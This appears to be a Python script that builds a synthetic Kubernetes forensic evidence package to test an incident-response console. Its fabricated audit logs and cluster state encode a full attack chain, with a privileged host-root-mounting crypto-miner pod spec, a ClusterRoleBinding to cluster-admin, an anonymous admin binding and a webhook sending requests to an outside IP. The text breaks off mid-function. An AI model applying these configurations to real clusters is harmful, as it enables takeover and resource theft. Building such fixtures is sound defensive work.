"""Generate a realistic synthetic on-prem Kubernetes Ventra evidence package.

The data tells the exact story the build spec's final acceptance criterion describes, so the
console can be checked against a known-good incident end to end:

    Recon from an unexpected source IP (list pods/secrets cluster-wide) → ``pods/exec`` into
    a production pod → Secret read (``get secrets``) → privilege escalation by creating a
    ClusterRoleBinding to cluster-admin → a privileged, hostPath-mounting miner pod scheduled
    into kube-system → a static pod manifest dropped on the control-plane node (privileged
    pod with NO audit entry) → an anonymous ClusterRoleBinding left behind for re-entry →
    delete burst against Events to cover the tracks.

Every collector in the baseline IR pack contributes the evidence it would really hold: the
API-server audit log has the who-did-what, the node journals have the image pull and the
container start, cluster_state has the miner pod with its risk verdict stamped on, rbac has
the binding, and etcd/control-plane posture carries the node-level findings.

No real data, no cluster calls. Produces a sealed .tar.zst through the collector's own
packaging code, so the demo exercises the real EPF path including artifact[] provenance.

Usage:
    python tests/fixtures/generate_kubernetes_demo_case.py --out tests/fixtures/
"""

from __future__ import annotations

import argparse
import gzip
import hashlib
import json
import sys
from datetime import UTC, datetime, timedelta
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from collector.engine.acquisition import artifact_refs_for_collectors  # noqa: E402
from collector.lib.chain_of_custody.signing import sign_manifest  # noqa: E402
from collector.lib.models import (  # noqa: E402
    GapReason,
    Manifest,
    Operator,
    SourceResult,
    SourceStatus,
    TimeWindow,
    WrittenFile,
)
from collector.lib.packaging.packager import seal_package  # noqa: E402

CLUSTER = "prod-k8s-onprem"
CP_NODE = "cp-1"
WORKER_NODE = "worker-2"
ATTACKER_IP = "203.0.113.66"
ADMIN_IP = "10.20.0.15"
VICTIM_SA = "system:serviceaccount:prod:web-runner"
ATTACKER_USER = "mallory@contractor.example"
MINER_IMAGE = "docker.io/evilcorp/xmrig:latest"
BASE = datetime(2026, 6, 11, 2, 14, 0, tzinfo=UTC)


def _t(offset_seconds: int) -> str:
    return (BASE + timedelta(seconds=offset_seconds)).strftime("%Y-%m-%dT%H:%M:%SZ")


def _journal_ts(offset_seconds: int) -> str:
    """journald __REALTIME_TIMESTAMP: microseconds since the epoch, as a string."""
    return str(int((BASE + timedelta(seconds=offset_seconds)).timestamp() * 1_000_000))


# ---------------------------------------------------------------------------------------
# API-server audit log — the crown jewel: who did what
# ---------------------------------------------------------------------------------------
def _audit(
    offset: int,
    verb: str,
    resource: str,
    *,
    subresource: str = "",
    namespace: str = "",
    name: str = "",
    user: str = ATTACKER_USER,
    ip: str = ATTACKER_IP,
    code: int = 200,
    groups: list[str] | None = None,
    request_object: dict | None = None,
) -> dict:
    rec: dict = {
        "kind": "Event",
        "apiVersion": "audit.k8s.io/v1",
        "level": "RequestResponse",
        "auditID": f"aud-{offset:05d}-0000-4000-8000-000000000000",
        "stage": "ResponseComplete",
        "requestURI": f"/api/v1/namespaces/{namespace}/{resource}/{name}".rstrip("/"),
        "verb": verb,
        "user": {
            "username": user,
            "groups": groups or ["system:authenticated"],
        },
        "sourceIPs": [ip],
        "userAgent": "kubectl/v1.30.2",
        "objectRef": {
            "resource": resource,
            "namespace": namespace,
            "name": name,
            "apiVersion": "v1",
        },
        "responseStatus": {"metadata": {}, "code": code},
        "requestReceivedTimestamp": _t(offset),
        "stageTimestamp": _t(offset),
        "annotations": {"authorization.k8s.io/decision": "allow"},
    }
    if subresource:
        rec["objectRef"]["subresource"] = subresource
    if request_object:
        rec["requestObject"] = request_object
    return rec


def build_apiserver_audit() -> list[dict]:
    miner_spec = {
        "kind": "Pod",
        "metadata": {"name": "kube-proxy-metrics", "namespace": "kube-system"},
        "spec": {
            "hostPID": True,
            "hostNetwork": True,
            "nodeName": WORKER_NODE,
            "containers": [
                {
                    "name": "metrics",
                    "image": MINER_IMAGE,
                    "securityContext": {"privileged": True},
                    "volumeMounts": [{"name": "host", "mountPath": "/host"}],
                }
            ],
            "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
        },
    }
    crb = {
        "kind": "ClusterRoleBinding",
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "metadata": {"name": "svc-monitor-admin"},
        "roleRef": {"apiGroup": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"},
        "subjects": [{"kind": "ServiceAccount", "name": "web-runner", "namespace": "prod"}],
    }

    events: list[dict] = [
        # Baseline admin activity from the expected range.
        _audit(-3600, "list", "pods", namespace="prod", user="ops@ventra.example", ip=ADMIN_IP),
        _audit(
            -3500,
            "get",
            "configmaps",
            namespace="prod",
            name="web-config",
            user="ops@ventra.example",
            ip=ADMIN_IP,
        ),
        # 1. Recon from an unexpected source IP.
        _audit(0, "list", "pods", namespace="", name=""),
        _audit(12, "list", "secrets", namespace="", name=""),
        _audit(20, "list", "serviceaccounts", namespace="prod"),
        _audit(31, "get", "pods", namespace="prod", name="web-7d9f8b6c4-xk2lp"),
        # 2. Shell in the container.
        _audit(64, "create", "pods", subresource="exec", namespace="prod", name="web-7d9f8b6c4-xk2lp"),
        # 3. Credential access — the SA token from inside the pod reads a Secret.
        _audit(
            96,
            "get",
            "secrets",
            namespace="prod",
            name="db-credentials",
            user=VICTIM_SA,
            groups=["system:serviceaccounts", "system:authenticated"],
        ),
        _audit(
            104,
            "get",
            "secrets",
            namespace="prod",
            name="registry-pull",
            user=VICTIM_SA,
            groups=["system:serviceaccounts", "system:authenticated"],
        ),
        # 4. Privilege escalation.
        _audit(150, "create", "clusterrolebindings", name="svc-monitor-admin", request_object=crb),
        # 5. Execution — the privileged miner pod.
        _audit(
            190,
            "create",
            "pods",
            namespace="kube-system",
            name="kube-proxy-metrics",
            request_object=miner_spec,
        ),
        # 6. Port-forward for the C2 channel.
        _audit(
            240,
            "create",
            "pods",
            subresource="portforward",
            namespace="kube-system",
            name="kube-proxy-metrics",
        ),
        # 7. Anonymous binding left behind for re-entry.
        _audit(300, "create", "clusterrolebindings", name="system-anon-reader"),
        # 8. A denied attempt — the collector must keep 403s, they show intent.
        _audit(330, "delete", "validatingwebhookconfigurations", name="gatekeeper-validating", code=403),
        # 9. Anti-forensics: delete burst against Events.
        *[_audit(400 + i * 3, "delete", "events", namespace="prod", name=f"evt-{i}") for i in range(14)],
        # 10. Anonymous probe of the API.
        _audit(500, "get", "nodes", user="system:anonymous", groups=["system:unauthenticated"], code=403),
    ]
    return events


# ---------------------------------------------------------------------------------------
# Events — both APIs, as the collector emits them
# ---------------------------------------------------------------------------------------
def build_events() -> list[dict]:
    def core(uid, offset, reason, kind, ns, name, message, etype="Warning", node=WORKER_NODE):
        return {
            "metadata": {
                "uid": uid,
                "name": f"{name}.{uid}",
                "namespace": ns,
                "creation_timestamp": _t(offset),
            },
            "involved_object": {"kind": kind, "namespace": ns, "name": name},
            "reason": reason,
            "message": message,
            "type": etype,
            "first_timestamp": _t(offset),
            "last_timestamp": _t(offset),
            "source": {"component": "kubelet", "host": node},
            "count": 1,
            "_ventra_cluster": CLUSTER,
            "_ventra_event_api": "core/v1",
        }

    events = [
        core(
            "ev-01",
            195,
            "Pulling",
            "Pod",
            "kube-system",
            "kube-proxy-metrics",
            f'Pulling image "{MINER_IMAGE}"',
            etype="Normal",
        ),
        core(
            "ev-02",
            203,
            "Pulled",
            "Pod",
            "kube-system",
            "kube-proxy-metrics",
            f'Successfully pulled image "{MINER_IMAGE}" in 7.6s',
            etype="Normal",
        ),
        core(
            "ev-03",
            206,
            "Created",
            "Pod",
            "kube-system",
            "kube-proxy-metrics",
            "Created container metrics",
            etype="Normal",
        ),
        core(
            "ev-04",
            520,
            "OOMKilling",
            "Pod",
            "prod",
            "web-7d9f8b6c4-xk2lp",
            "Memory cgroup out of memory: Killed process 4211 (node)",
        ),
        core(
            "ev-05",
            560,
            "BackOff",
            "Pod",
            "prod",
            "web-7d9f8b6c4-xk2lp",
            "Back-off restarting failed container",
        ),
        core(
            "ev-06",
            610,
            "FailedMount",
            "Pod",
            "kube-system",
            "kube-proxy-metrics",
            'MountVolume.SetUp failed for volume "host" : hostPath type check failed',
        ),
        core(
            "ev-07",
            640,
            "Evicted",
            "Pod",
            "prod",
            "api-5f6c7d8e9-mn3kq",
            "The node was low on resource: memory",
        ),
    ]
    # One event exists only in the events.k8s.io/v1 view, with that API's own field names
    # (regarding / note / event_time) rather than core/v1's. The collector already folded the
    # overlapping records together — config.json records one de-duplication — so what is
    # sealed here is the merged set the ingester really sees.
    events.append(
        {
            "metadata": {
                "uid": "ev-08",
                "name": "gatekeeper-audit.ev-08",
                "namespace": "gatekeeper-system",
                "creation_timestamp": _t(660),
            },
            "regarding": {
                "kind": "Pod",
                "namespace": "gatekeeper-system",
                "name": "gatekeeper-audit-6d4b9c8f5-t2wqz",
            },
            "reason": "Unhealthy",
            "note": "Readiness probe failed: HTTP probe failed with statuscode: 500",
            "type": "Warning",
            "event_time": _t(660),
            "reporting_instance": WORKER_NODE,
            "_ventra_cluster": CLUSTER,
            "_ventra_event_api": "events.k8s.io/v1",
        }
    )
    return events


# ---------------------------------------------------------------------------------------
# Cluster state — objects carry their own risk verdict (_ventra_suspicious)
# ---------------------------------------------------------------------------------------
def _obj(kind: str, name: str, *, namespace: str = "", created: int = -86400, **extra) -> dict:
    meta: dict = {"name": name, "uid": f"uid-{kind}-{name}", "creation_timestamp": _t(created)}
    if namespace:
        meta["namespace"] = namespace
    rec: dict = {"metadata": meta, "_ventra_cluster": CLUSTER, "_ventra_kind": kind}
    rec.update(extra)
    return rec


def build_cluster_state() -> dict[str, list[dict]]:
    miner = _obj(
        "pods",
        "kube-proxy-metrics",
        namespace="kube-system",
        created=190,
        spec={
            "node_name": WORKER_NODE,
            "host_pid": True,
            "host_network": True,
            "service_account_name": "default",
            "containers": [
                {"name": "metrics", "image": MINER_IMAGE, "security_context": {"privileged": True}}
            ],
            "volumes": [{"name": "host", "host_path": {"path": "/"}}],
        },
        status={
            "phase": "Running",
            "container_statuses": [
                {"name": "metrics", "image": MINER_IMAGE, "image_id": "sha256:6b1f9c2e" + "0" * 56}
            ],
        },
    )
    # The collector stamps its verdict onto the record before sealing.
    miner["_ventra_suspicious"] = [
        "hostNetwork",
        "hostPID",
        "hostPath!:/",
        "privileged:metrics",
        f"untrusted_image:{MINER_IMAGE}",
    ]

    web = _obj(
        "pods",
        "web-7d9f8b6c4-xk2lp",
        namespace="prod",
        spec={
            "node_name": WORKER_NODE,
            "service_account_name": "web-runner",
            "containers": [{"name": "web", "image": "registry.k8s.io/nginx:1.25"}],
        },
        status={
            "phase": "Running",
            "container_statuses": [
                {
                    "name": "web",
                    "image": "registry.k8s.io/nginx:1.25",
                    "image_id": "sha256:aa11bb22" + "0" * 56,
                }
            ],
        },
    )
    gatekeeper = _obj(
        "pods",
        "gatekeeper-audit-6d4b9c8f5-t2wqz",
        namespace="gatekeeper-system",
        spec={
            "node_name": WORKER_NODE,
            "service_account_name": "gatekeeper-admin",
            "containers": [{"name": "manager", "image": "openpolicyagent/gatekeeper:v3.15.0"}],
        },
        status={"phase": "Running"},
    )
    gatekeeper["_ventra_suspicious"] = ["untrusted_image:openpolicyagent/gatekeeper:v3.15.0"]

    return {
        "pods": [web, miner, gatekeeper],
        "nodes": [
            _obj(
                "nodes",
                CP_NODE,
                status={
                    "node_info": {
                        "kubelet_version": "v1.30.2",
                        "os_image": "Ubuntu 22.04.4 LTS",
                        "kernel_version": "5.15.0-107-generic",
                        "container_runtime_version": "containerd://1.7.16",
                    }
                },
            ),
            _obj(
                "nodes",
                WORKER_NODE,
                status={
                    "node_info": {
                        "kubelet_version": "v1.30.2",
                        "os_image": "Ubuntu 22.04.4 LTS",
                        "kernel_version": "5.15.0-107-generic",
                        "container_runtime_version": "containerd://1.7.16",
                    }
                },
            ),
        ],
        "namespaces": [
            _obj("namespaces", "prod", metadata_labels={}),
            _obj("namespaces", "kube-system"),
            _obj("namespaces", "gatekeeper-system"),
        ],
        "serviceaccounts": [
            _obj("serviceaccounts", "web-runner", namespace="prod", secrets=[{"name": "web-runner-token"}]),
            _obj("serviceaccounts", "default", namespace="kube-system"),
            _obj(
                "serviceaccounts",
                "gatekeeper-admin",
                namespace="gatekeeper-system",
                automount_service_account_token=False,
            ),
        ],
        "secrets": [
            _obj("secrets", "db-credentials", namespace="prod", type="Opaque"),
            _obj("secrets", "registry-pull", namespace="prod", type="kubernetes.io/dockerconfigjson"),
        ],
        "deployments": [
            _obj("deployments", "web", namespace="prod", spec={"replicas": 3}, status={"ready_replicas": 2}),
        ],
        "cronjobs": [
            _obj("cronjobs", "backup", namespace="prod", spec={"schedule": "0 2 * * *"}),
            _obj(
                "cronjobs",
                "sync-metrics",
                namespace="kube-system",
                created=210,
                spec={"schedule": "*/5 * * * *"},
            ),
        ],
        "persistentvolumes": [
            _obj(
                "persistentvolumes",
                "pv-local-01",
                spec={"host_path": {"path": "/mnt/data"}, "storage_class_name": "local"},
            ),
            _obj(
                "persistentvolumes",
                "pv-nfs-01",
                spec={"nfs": {"path": "/exports/prod"}, "storage_class_name": "nfs"},
            ),
        ],
        "networkpolicies": [
            _obj("networkpolicies", "default-deny", namespace="prod"),
        ],
        "customresourcedefinitions": [
            _obj("customresourcedefinitions", "constrainttemplates.templates.gatekeeper.sh"),
        ],
        "mutatingwebhookconfigurations": [
            _obj(
                "mutatingwebhookconfigurations",
                "gatekeeper-mutating-webhook-configuration",
                webhooks=[
                    {
                        "name": "mutation.gatekeeper.sh",
                        "client_config": {
                            "service": {
                                "namespace": "gatekeeper-system",
                                "name": "gatekeeper-webhook-service",
                            }
                        },
                    }
                ],
            ),
            _obj(
                "mutatingwebhookconfigurations",
                "sidecar-injector",
                created=280,
                webhooks=[
                    {
                        "name": "inject.evil.example",
                        "client_config": {"url": "https://185.220.101.45:8443/mutate"},
                    }
                ],
            ),
        ],
        "validatingwebhookconfigurations": [
            _obj(
                "validatingwebhookconfigurations",
                "gatekeeper-validating",
                webhooks=[
                    {
                        "name": "validation.gatekeeper.sh",
                        "client_config": {
                            "service": {
                                "namespace": "gatekeeper-system",
                                "name": "gatekeeper-webhook-service",
                            }
                        },
                    }
                ],
            ),
        ],
    }


def build_cluster_state_sidecars(objects: dict[str, list[dict]]) -> dict[str, object]:
    pods = objects["pods"]
    suspicious = [
        {
            "pod": f"{p['metadata'].get('namespace', '')}/{p['metadata']['name']}",
            "findings": p["_ventra_suspicious"],
        }
        for p in pods
        if p.get("_ventra_suspicious")
    ]
    images = []
    for pod in pods:
        for c in (pod.get("spec") or {}).get("containers") or []:
            ids = {
                cs.get("name"): cs.get("image_id", "")
                for cs in ((pod.get("status") or {}).get("container_statuses") or [])
            }
            images.append(
                {
                    "image": c["image"],
                    "imageID": ids.get(c["name"], ""),
                    "trusted": c["image"].startswith("registry.k8s.io"),
                    "pods": [f"{pod['metadata'].get('namespace', '')}/{pod['metadata']['name']}"],
                }
            )
    return {
        "suspicious_pods": suspicious,
        "images": {"images": images, "untrusted": [i for i in images if not i["trusted"]]},
        "pod_security": {
            "namespaces": [
                {
                    "namespace": "prod",
                    "pod_security_labels": {"pod-security.kubernetes.io/enforce": "baseline"},
                },
                {"namespace": "kube-system", "pod_security_labels": {}},
                {
                    "namespace": "gatekeeper-system",
                    "pod_security_labels": {"pod-security.kubernetes.io/enforce": "privileged"},
                },
            ],
            "unlabelled_namespaces": ["kube-system"],
            "privileged_namespaces": ["gatekeeper-system"],
            "psp_api_present": False,
            "podsecuritypolicies": [],
        },
        "service_accounts": {
            "accounts": [
                {
                    "namespace": "prod",
                    "name": "web-runner",
                    "automount_service_account_token": True,
                    "automount_explicit": False,
                    "secrets": ["web-runner-token"],
                    "image_pull_secrets": [],
                    "pods": ["web-7d9f8b6c4-xk2lp"],
                },
                {
                    "namespace": "kube-system",
                    "name": "default",
                    "automount_service_account_token": True,
                    "automount_explicit": False,
                    "secrets": [],
                    "image_pull_secrets": [],
                    "pods": ["kube-proxy-metrics"],
                },
                {
                    "namespace": "gatekeeper-system",
                    "name": "gatekeeper-admin",
                    "automount_service_account_token": False,
                    "automount_explicit": True,
                    "secrets": [],
                    "image_pull_secrets": [],
                    "pods": ["gatekeeper-audit-6d4b9c8f5-t2wqz"],
                },
            ],
            "automounting": ["kube-system/default", "prod/web-runner"],
        },
        "hostpath_volumes": [
            {"name": "pv-local-01", "path": "/mnt/data", "storageClassName": "local", "claimRef": {}},
        ],
        "environment": {
            "cluster": {
                "determined": True,
                "gitVersion": "v1.30.2",
                "platform": "linux/amd64",
                "buildDate": "2026-05-14T09:12:33Z",
                "major": "1",
                "minor": "30",
            },
            "discovery": {
                "determined": True,
                "group_versions": [
                    "v1",
                    "apps/v1",
                    "batch/v1",
                    "rbac.authorization.k8s.io/v1",
                    "templates.gatekeeper.sh/v1",
                ],
                "groups": [],
                "resources": {},
                "errors": {},
            },
        },
    }


# ---------------------------------------------------------------------------------------
# RBAC — verdicts stamped on, as the collector seals them
# ---------------------------------------------------------------------------------------
def build_rbac() -> dict[str, list[dict]]:
    cluster_admin = _obj(
        "clusterroles", "cluster-admin", rules=[{"verbs": ["*"], "resources": ["*"], "api_groups": ["*"]}]
    )
    cluster_admin["_ventra_grants"] = [
        "cluster-admin",
        "can read secrets cluster-wide",
        "wildcard verb+resource (cluster-admin-equivalent)",
    ]
    view = _obj(
        "clusterroles", "view", rules=[{"verbs": ["get", "list"], "resources": ["pods"], "api_groups": [""]}]
    )
    secret_reader = _obj(
        "roles",
        "secret-reader",
        namespace="prod",
        rules=[{"verbs": ["get", "list"], "resources": ["secrets"], "api_groups": [""]}],
    )
    secret_reader["_ventra_grants"] = ["can read secrets cluster-wide"]

    escalation = _obj(
        "clusterrolebindings",
        "svc-monitor-admin",
        created=150,
        role_ref={"api_group": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"},
        subjects=[{"kind": "ServiceAccount", "name": "web-runner", "namespace": "prod"}],
    )
    escalation["_ventra_grants"] = cluster_admin["_ventra_grants"]

    anonymous = _obj(
        "clusterrolebindings",
        "system-anon-reader",
        created=300,
        role_ref={"api_group": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "cluster-admin"},
        subjects=[{"kind": "User", "name": "system:anonymous", "api_group": "rbac.authorization.k8s.io"}],
    )
    anonymous["_ventra_grants"] = cluster_admin["_ventra_grants"]
    anonymous["_ventra_anonymous_subjects"] = ["system:anonymous"]

    benign = _obj(
        "clusterrolebindings",
        "ops-view",
        role_ref={"api_group": "rbac.authorization.k8s.io", "kind": "ClusterRole", "name": "view"},
        subjects=[{"kind": "Group", "name": "ops"}],
    )

    ns_binding = _obj(
        "rolebindings",
        "prod-secret-reader",
        namespace="prod",
        role_ref={"api_group": "rbac.authorization.k8s.io", "kind": "Role", "name": "secret-reader"},
        subjects=[{"kind": "ServiceAccount", "name": "web-runner", "namespace": "prod"}],
    )
    ns_binding["_ventra_grants"] = ["can read secrets cluster-wide"]

    return {
        "clusterroles": [cluster_admin, view],
        "roles": [secret_reader],
        "clusterrolebindings": [escalation, anonymous, benign],
        "rolebindings": [ns_binding],
    }


# ---------------------------------------------------------------------------------------
# Node-plane journals and logs
# ---------------------------------------------------------------------------------------
def _journal(offset: int, unit: str, message: str, *, priority: int = 6, node: str = WORKER_NODE) -> dict:
    return {
        "__REALTIME_TIMESTAMP": _journal_ts(offset),
        "_SYSTEMD_UNIT": unit,
        "PRIORITY": str(priority),
        "MESSAGE": message,
        "_HOSTNAME": node,
        "_ventra_node": node,
        "_ventra_cluster": CLUSTER,
        "_ventra_runtime": "containerd",
        "_ventra_runtime_version": "1.7.16",
        "_ventra_kubelet_version": "v1.30.2",
        "_ventra_kernel": "5.15.0-107-generic",
    }


def build_kubelet_logs() -> list[dict]:
    return [
        _journal(191, "kubelet.service", 'SyncLoop ADD "kube-system/kube-proxy-metrics"'),
        _journal(193, "kubelet.service", f'Pulling image "{MINER_IMAGE}" for container metrics'),
        _journal(205, "kubelet.service", "Started container metrics in pod kube-system/kube-proxy-metrics"),
        _journal(
            207,
            "kubelet.service",
            'Pod "kube-proxy-metrics" admitted with hostPID=true hostNetwork=true',
            priority=4,
        ),
        _journal(
            521, "kubelet.service", "Memory cgroup out of memory: OOM-killed process in prod/web", priority=3
        ),
        _journal(
            612,
            "kubelet.service",
            'MountVolume.SetUp failed for volume "host": permission denied',
            priority=3,
        ),
    ]


def build_runtime_logs() -> list[dict]:
    journal = [
        _journal(193, "containerd.service", f'PullImage "{MINER_IMAGE}" from registry docker.io'),
        _journal(204, "containerd.service", f'ImageCreate event name:"{MINER_IMAGE}"'),
        _journal(206, "containerd.service", "StartContainer for 9f2c1e7b4a55 returns successfully"),
        _journal(
            700,
            "containerd.service",
            'failed to pull image "docker.io/evilcorp/stage2:latest": unauthorized: authentication required',
            priority=3,
        ),
    ]
    inspect = [
        {
            "container_id": "9f2c1e7b4a5561d3",
            "pod": "kube-proxy-metrics",
            "namespace": "kube-system",
            "container": "metrics",
            "inspect": {
                "status": {
                    "id": "9f2c1e7b4a5561d3",
                    "state": "CONTAINER_RUNNING",
                    "image": {"image": MINER_IMAGE},
                },
                "info": {
                    "runtimeSpec": {"process": {"args": ["/xmrig", "--donate-level=1"]}},
                    "snapshotKey": "9f2c1e7b4a5561d3",
                },
            },
            "_ventra_node": WORKER_NODE,
            "_ventra_cluster": CLUSTER,
            "_ventra_runtime": "containerd",
        },
    ]
    return journal + inspect


def build_etcd_logs() -> list[dict]:
    return [
        _journal(150, "etcd.service", "applied a new ClusterRoleBinding write, revision 44120", node=CP_NODE),
        _journal(
            660,
            "etcd.service",
            'rejected connection from 10.20.4.9:51022 (error "tls: bad certificate")',
            priority=3,
            node=CP_NODE,
        ),
    ]


# ---------------------------------------------------------------------------------------
# Packaging
# ---------------------------------------------------------------------------------------
def _write_gz_jsonl(path: Path, records: list[dict]) -> WrittenFile:
    path.parent.mkdir(parents=True, exist_ok=True)
    with gzip.GzipFile(filename=path, mode="wb", mtime=0) as gz:
        for r in records:
            gz.write((json.dumps(r, separators=(",", ":")) + "\n").encode())
    data = path.read_bytes()
    return WrittenFile(
        path=path.name, sha256=hashlib.sha256(data).hexdigest(), bytes=len(data), record_count=len(records)
    )


def _write_json(path: Path, obj) -> WrittenFile:
    path.parent.mkdir(parents=True, exist_ok=True)
    payload = json.dumps(obj, indent=2).encode()
    path.write_bytes(payload)
    return WrittenFile(path=path.name, sha256=hashlib.sha256(payload).hexdigest(), bytes=len(payload))


def _write_text(path: Path, text: str) -> WrittenFile:
    path.parent.mkdir(parents=True, exist_ok=True)
    payload = text.encode()
    path.write_bytes(payload)
    return WrittenFile(path=path.name, sha256=hashlib.sha256(payload).hexdigest(), bytes=len(payload))


SOURCES = [
    "k8s_events",
    "k8s_container_logs",
    "k8s_runtime_logs",
    "k8s_kubelet_logs",
    "k8s_etcd",
    "k8s_apiserver_audit",
    "k8s_audit_posture",
    "k8s_cluster_state",
    "k8s_rbac",
]


def generate(out_dir: Path, case_id: str = "CASE-2026-K8S1") -> Path:
    import tempfile

    with tempfile.TemporaryDirectory(prefix="ventra-k8s-demo-") as tmp:
        staging = Path(tmp)
        manifest = Manifest(
            schema_version="1.0.0",
            tool_version="demo",
            case_id=case_id,
            cloud="kubernetes",
            account_id=CLUSTER,
            partition="kubernetes",
            account_alias="v1.30.2",
            regions=[],
            operator=Operator(
                principal_arn="kubernetes:ventra-collector", user_id="ventra-collector", source_ip=ADMIN_IP
            ),
            started_at=_t(-60),
            completed_at=_t(900),
            profile_name="all",
            host_environment="local",
            host_os="Ubuntu 22.04.4 LTS",
            host_runtime="python 3.12.3; runtime=containerd 1.7.16",
            time_window=TimeWindow(since=BASE - timedelta(hours=2)),
        )
        manifest.artifacts = artifact_refs_for_collectors("kubernetes", SOURCES)

        def src(dirname, files, status=SourceStatus.COLLECTED, gaps=None, notes=""):
            wfs = []
            for fname, wf in files:
                wf.path = f"sources/{dirname}/{fname}"
                wfs.append(wf)
            manifest.add_source_result(
                SourceResult(name=dirname, status=status, files=wfs, gaps=gaps or [], notes=notes)
            )

        sd = staging / "sources"

        audit = build_apiserver_audit()
        events = build_events()
        objects = build_cluster_state()
        sidecars = build_cluster_state_sidecars(objects)
        rbac = build_rbac()

        # --- Events (most perishable) ---------------------------------------------------
        src(
            "k8s_events",
            [
                ("events.jsonl.gz", _write_gz_jsonl(sd / "k8s_events/events.jsonl.gz", events)),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_events/config.json",
                        {
                            "event_ttl": "1h0m0s",
                            "event_ttl_source": "kube-apiserver manifest (--event-ttl=1h0m0s)",
                            "collected": len(events),
                            "flagged": 5,
                            "apis": {
                                "core/v1": {"readable": True, "events": 7},
                                "events.k8s.io/v1": {"readable": True, "events": 2},
                            },
                            "deduplicated": 1,
                        },
                    ),
                ),
            ],
            notes=f"{len(events)} event(s) from both Event APIs; 1 de-duplicated.",
        )

        # --- Container logs from the node (files + index) -------------------------------
        src(
            "k8s_container_logs",
            [
                (
                    "logs__var__log__pods__kube-system_kube-proxy-metrics_uid9__metrics__0.log",
                    _write_text(
                        sd / "k8s_container_logs/logs__var__log__pods__kube-system_kube-proxy-metrics"
                        "_uid9__metrics__0.log",
                        f"{_t(207)} stdout F [*] xmrig 6.21.0 starting\n",
                    ),
                ),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_container_logs/config.json",
                        {
                            "logs": [
                                {
                                    "namespace": "kube-system",
                                    "pod": "kube-proxy-metrics",
                                    "uid": "uid9",
                                    "container": "metrics",
                                    "host_path": "/var/log/pods/kube-system_kube-proxy-metrics_uid9/metrics/0.log",
                                    "rotated": False,
                                    "sha256": "0" * 64,
                                },
                                {
                                    "namespace": "prod",
                                    "pod": "web-7d9f8b6c4-xk2lp",
                                    "uid": "uid1",
                                    "container": "web",
                                    "host_path": "/var/log/pods/prod_web-7d9f8b6c4-xk2lp_uid1/web/0.log.20260611",
                                    "rotated": True,
                                    "sha256": "0" * 64,
                                },
                            ],
                            "rotated_logs": 1,
                            "node": {
                                "node_name": WORKER_NODE,
                                "runtime": "containerd",
                                "kubelet_version": "v1.30.2",
                            },
                        },
                    ),
                ),
            ],
            notes="2 container log file(s) (1 rotated) from worker-2.",
        )

        # --- Node journals --------------------------------------------------------------
        runtime = build_runtime_logs()
        src(
            "k8s_runtime_logs",
            [
                ("runtime.jsonl.gz", _write_gz_jsonl(sd / "k8s_runtime_logs/runtime.jsonl.gz", runtime[:4])),
                (
                    "container_inspect.jsonl.gz",
                    _write_gz_jsonl(sd / "k8s_runtime_logs/container_inspect.jsonl.gz", runtime[4:]),
                ),
                (
                    "live_state.json",
                    _write_json(
                        sd / "k8s_runtime_logs/live_state.json",
                        {
                            "available": True,
                            "containers": {
                                "containers": [
                                    {
                                        "id": "9f2c1e7b4a5561d3",
                                        "labels": {"io.kubernetes.pod.name": "kube-proxy-metrics"},
                                    }
                                ]
                            },
                        },
                    ),
                ),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_runtime_logs/config.json",
                        {
                            "runtime": {
                                "runtime": "containerd",
                                "version": "1.7.16",
                                "socket": "/run/containerd/containerd.sock",
                                "storage_root": "/var/lib/containerd",
                                "detected_from": "socket",
                            },
                            "unit": "containerd",
                            "source": "journalctl -u containerd",
                            "containers_inspected": 1,
                            "node": {"node_name": WORKER_NODE, "runtime": "containerd"},
                        },
                    ),
                ),
            ],
            notes="containerd journal + 1 container inspected.",
        )

        kubelet = build_kubelet_logs()
        src(
            "k8s_kubelet_logs",
            [
                ("kubelet.jsonl.gz", _write_gz_jsonl(sd / "k8s_kubelet_logs/kubelet.jsonl.gz", kubelet)),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_kubelet_logs/config.json",
                        {
                            "source": "journalctl -u kubelet",
                            "node": {"node_name": WORKER_NODE, "runtime": "containerd"},
                        },
                    ),
                ),
            ],
            notes=f"{len(kubelet)} kubelet journal record(s).",
        )

        etcd = build_etcd_logs()
        src(
            "k8s_etcd",
            [
                ("etcd.jsonl.gz", _write_gz_jsonl(sd / "k8s_etcd/etcd.jsonl.gz", etcd)),
                (
                    "config.json",
                    _write_json(
                        sd / "k8s_etcd/config.json",
                        {
                            "posture": {
                                "determined": True,
                                "flags": {
                                    "client-cert-auth": "true",
                                    "listen-client-urls": "https://127.0.0.1:2379",
                                    "cert-file": "/etc/kubernetes/pki/etcd/server.crt",
                                    "trusted-ca-file": "/etc/kubernetes/pki/etcd/ca.crt",
                                    "data-dir": "/var/lib/etcd",
                                },
                                "issues": [
                                    "Kubernetes encryption-at-rest is NOT configured (no "
                                    "--encryption-provider-config on kube-apiserver): every Secret in the "
                                    "cluster is stored in etcd in plaintext."
                                ],
                                "encryption_at_rest": {
                                    "determined": True,
                                    "enabled": False,
                                    "config_file": "",
                                },
                            },
                            "data_dir": {
                                "path": "/var/lib/etcd",
                                "present": True,
                                "mode": "0o700",
                                "total_bytes": 41943040,
                                "files": [],
                            },
                            "tls_material": {
                                "dir": "/etc/kubernetes/pki/etcd",
                                "present": True,
                                "files": [
                                    {
                                        "path": "/etc/kubernetes/pki/etcd/server.crt",
                                        "captured": True,
                                        "sha256": "3" * 64,
                                        "mode": "0o644",
                                    },
                                    {
                                        "path": "/etc/kubernetes/pki/etcd/server.key",
                                        "captured": False,
                                        "sha256": "4" * 64,
                                        "mode": "0o600",
                                        "note": "private key — hashed only, contents not captured",
                                    },
                                ],
                            },
                            "topology": {
                                "available": True,
                                "member_count": 1,
                                "unhealthy_endpoints": [],
                                "endpoints": "https://127.0.0.1:2379",
                            },
                            "log_files": 0,
                            "db_dumped": False,
                            "node": {"node_name": CP_NODE, "runtime": "containerd"},
                        },
                    ),
                ),
            ],
            status=SourceStatus.PARTIAL,
            gaps=[
                (
                    "k8s_etcd",
                    GapReason.LOGGING_NOT_CONFIGURED,
